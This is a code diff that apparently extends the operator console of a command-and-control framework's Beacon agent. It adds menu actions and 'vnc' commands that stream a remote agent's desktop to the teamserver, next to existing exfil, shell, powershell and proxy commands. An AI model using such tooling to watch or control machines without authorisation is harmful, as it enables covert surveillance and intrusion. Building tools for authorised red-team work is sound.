@@ -1,5 +1,52 @@
 /// Beacon agent
 
+let vnc_start_action = menu.create_action("Start VNC Session", function(agents) {
+    agents.forEach(function(agent) {
+        let label_target_port = form.create_label("Target Port (on agent):");
+        let spin_target_port = form.create_spin();
+        spin_target_port.setRange(1024, 65535);
+        spin_target_port.setValue(40484);
+        let label_local_port = form.create_label("Local Port (on C2):");
+        let spin_local_port = form.create_spin();
+        spin_local_port.setRange(1024, 65535);
+        spin_local_port.setValue(41484);
+        let layout = form.create_gridlayout();
+        layout.addWidget(label_target_port, 0, 0, 1, 1);
+        layout.addWidget(spin_target_port, 0, 1, 1, 1);
+        layout.addWidget(label_local_port, 1, 0, 1, 1);
+        layout.addWidget(spin_local_port, 1, 1, 1, 1);
+        let dialog = form.create_dialog("Start VNC Session");
+        dialog.setSize(400, 120);
+        dialog.setLayout(layout);
+        if (dialog.exec() == true) {
+            ax.execute_command(agent, "vnc start " + spin_target_port.value() + " " + spin_local_port.value());
+        }
+    });
+});
+let vnc_view_action = menu.create_action("View Desktop", function(agents) { agents.forEach(v => ax.execute_command(v, "vnc view")) });
+let vnc_stop_action = menu.create_action("Stop VNC Session", function(agents) {
+    agents.forEach(function(agent) {
+        let port_label = form.create_label("Local Port:");
+        let port_spin = form.create_spin();
+        port_spin.setRange(1024, 65535);
+        port_spin.setValue(41484);
+        let layout = form.create_gridlayout();
+        layout.addWidget(port_label, 0, 0, 1, 1);
+        layout.addWidget(port_spin, 0, 1, 1, 1);
+        let dialog = form.create_dialog("Stop VNC Session");
+        dialog.setSize(300, 90);
+        dialog.setLayout(layout);
+        if (dialog.exec() == true) {
+            ax.execute_command(agent, "vnc stop " + port_spin.value());
+        }
+    });
+});
+let vnc_menu = menu.create_menu("VNC Desktop");
+vnc_menu.addItem(vnc_start_action);
+vnc_menu.addItem(vnc_view_action);
+vnc_menu.addItem(vnc_stop_action);
+menu.add_session_agent(vnc_menu, ["beacon"]);
+
 let exit_thread_action  = menu.create_action("Terminate thread",  function(value) { value.forEach(v => ax.execute_command(v, "terminate thread")) });
 let exit_process_action = menu.create_action("Terminate process", function(value) { value.forEach(v => ax.execute_command(v, "terminate process")) });
 let exit_menu = menu.create_menu("Exit");
@@ -273,23 +320,33 @@ function RegisterCommands(listenerType)
         ax.execute_alias(id, cmdline, "sleep 0");
     });
 
+    let _cmd_vnc_start = ax.create_command("start", "Start a VNC desktop streaming session", "vnc start 40484 41484", "Task: start VNC session");
+    _cmd_vnc_start.addArgInt("target_port", true, "Listen port on agent");
+    _cmd_vnc_start.addArgInt("local_port", true, "Listen port on teamserver");
+    let _cmd_vnc_stop = ax.create_command("stop", "Stop a VNC desktop streaming session", "vnc stop 41484", "Task: stop VNC session");
+    _cmd_vnc_stop.addArgInt("local_port", true, "Listen port on teamserver");
+    let _cmd_vnc_view = ax.create_command("view", "Show the VNC viewer URL", "vnc view", "Task: show VNC viewer");
+    let _cmd_vnc_list = ax.create_command("list", "List active VNC sessions", "vnc list", "Task: list VNC sessions");
+    let cmd_vnc = ax.create_command("vnc", "VNC remote desktop sessions");
+    cmd_vnc.addSubCommands([_cmd_vnc_start, _cmd_vnc_stop, _cmd_vnc_view, _cmd_vnc_list]);
+
     if(listenerType == "BeaconDNS") {
         let commands_dns = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
             cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd, cmd_sleep,
-            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact, cmd_burst] );
+            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact, cmd_vnc, cmd_burst] );
         return { commands_windows: commands_dns }
     }
     else if(listenerType == "BeaconHTTP") {
         let commands_http = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
             cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd, cmd_sleep,
-            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact] );
+            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact, cmd_vnc] );
 
         return { commands_windows: commands_http }
     }
     else if (listenerType == "BeaconSMB" || listenerType == "BeaconTCP") {
         let commands_internal = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
             cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd,
-            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact] );
+            cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact, cmd_vnc] );
 
         return { commands_windows: commands_internal }
     }
